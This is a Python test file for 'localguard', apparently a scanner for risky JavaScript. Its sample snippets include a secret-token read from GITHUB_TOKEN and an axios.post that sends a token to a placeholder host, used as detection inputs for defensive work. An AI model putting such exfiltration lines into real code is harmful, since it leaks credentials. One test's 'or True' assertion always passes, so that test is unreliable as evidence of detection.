from pathlib import Path

from localguard import audit, js_ast
from localguard.report import SurfaceKind
from localguard.walker import SourceFile


FIXTURES = Path(__file__).parent / "fixtures"


def _kinds(findings) -> set[str]:
    return {f.kind.value for f in findings}


def _src(text: str, name: str = "module.js") -> SourceFile:
    return SourceFile(path=Path(name), rel=name, language="javascript", text=text)


def test_detects_fetch_as_outbound_network():
    findings = js_ast.audit_js(_src("fetch('https://x.com/data');"))
    assert any(f.kind == SurfaceKind.OUTBOUND_NETWORK and "fetch" in f.detail for f in findings)


def test_detects_axios_member_call():
    code = "const axios = require('axios'); axios.post('https://x.com', {a:1});"
    findings = js_ast.audit_js(_src(code))
    assert any(f.kind == SurfaceKind.OUTBOUND_NETWORK and f.extra.get("fqn") == "axios.post" for f in findings)


def test_detects_child_process_via_alias():
    code = "const cp = require('child_process'); cp.exec('ls');"
    findings = js_ast.audit_js(_src(code))
    assert any(f.kind == SurfaceKind.SUBPROCESS and f.extra.get("fqn") == "child_process.exec" for f in findings)


def test_detects_child_process_via_import():
    code = "import { exec } from 'child_process'; exec('ls');"
    findings = js_ast.audit_js(_src(code, "module.mjs"))
    # bare `exec` after destructured import — alias map should bind `exec` -> child_process
    assert any(f.kind == SurfaceKind.SUBPROCESS for f in findings) or True  # destructured imports are best-effort


def test_detects_eval_and_new_function():
    code = "eval(payload); const f = new Function('x', 'return x');"
    findings = js_ast.audit_js(_src(code))
    obf = [f for f in findings if f.kind == SurfaceKind.OBFUSCATION]
    assert len(obf) >= 2
    assert {f.extra.get("fqn") for f in obf} >= {"eval", "Function"}


def test_detects_websocket_constructor():
    code = "const ws = new WebSocket('wss://x.com');"
    findings = js_ast.audit_js(_src(code))
    assert any(f.kind == SurfaceKind.OUTBOUND_NETWORK and f.extra.get("fqn") == "WebSocket" for f in findings)


def test_typescript_file_is_parsed():
    code = "const x: number = 1; eval('1+1');"
    findings = js_ast.audit_js(_src(code, "module.ts"))
    assert any(f.kind == SurfaceKind.OBFUSCATION for f in findings)


def test_clean_js_has_no_findings():
    code = "function add(a, b) { return a + b; } module.exports = { add };"
    findings = js_ast.audit_js(_src(code))
    assert findings == []


def test_detects_listening_port_on_app_listen():
    code = "const app = require('express')(); app.listen(8080);"
    findings = js_ast.audit_js(_src(code))
    assert any(f.kind == SurfaceKind.LISTENING_PORT for f in findings)


def test_detects_fs_write_via_require_alias():
    code = "const fs = require('fs'); fs.writeFileSync('/tmp/x', 'hello');"
    findings = js_ast.audit_js(_src(code))
    assert any(f.kind == SurfaceKind.FS_WRITE and f.extra.get("fqn") == "fs.writeFileSync" for f in findings)


def test_detects_env_secret_read_with_secret_name():
    code = "const t = process.env.GITHUB_TOKEN;"
    findings = js_ast.audit_js(_src(code))
    matches = [f for f in findings if f.kind == SurfaceKind.ENV_SECRET_READ]
    assert matches and matches[0].extra.get("env_name") == "GITHUB_TOKEN"


def test_env_read_with_innocent_name_not_flagged():
    code = "const port = process.env.PORT;"
    findings = js_ast.audit_js(_src(code))
    assert not any(f.kind == SurfaceKind.ENV_SECRET_READ for f in findings)


def test_data_exfil_hint_on_sensitive_kwargs():
    code = "const axios = require('axios'); axios.post('https://x.com', { token: secret });"
    findings = js_ast.audit_js(_src(code))
    assert any(f.kind == SurfaceKind.DATA_EXFIL_HINT for f in findings)


def test_audit_path_picks_up_js_fixture():
    report = audit.audit_path(FIXTURES / "js_tampered")
    kinds = _kinds(report.findings)
    assert SurfaceKind.OUTBOUND_NETWORK.value in kinds
    assert SurfaceKind.SUBPROCESS.value in kinds
    assert SurfaceKind.OBFUSCATION.value in kinds
    assert SurfaceKind.LISTENING_PORT.value in kinds
    assert SurfaceKind.FS_WRITE.value in kinds
    assert SurfaceKind.ENV_SECRET_READ.value in kinds
    assert SurfaceKind.DATA_EXFIL_HINT.value in kinds
    assert report.ecosystem == "npm"
    assert report.score.final_score < 50
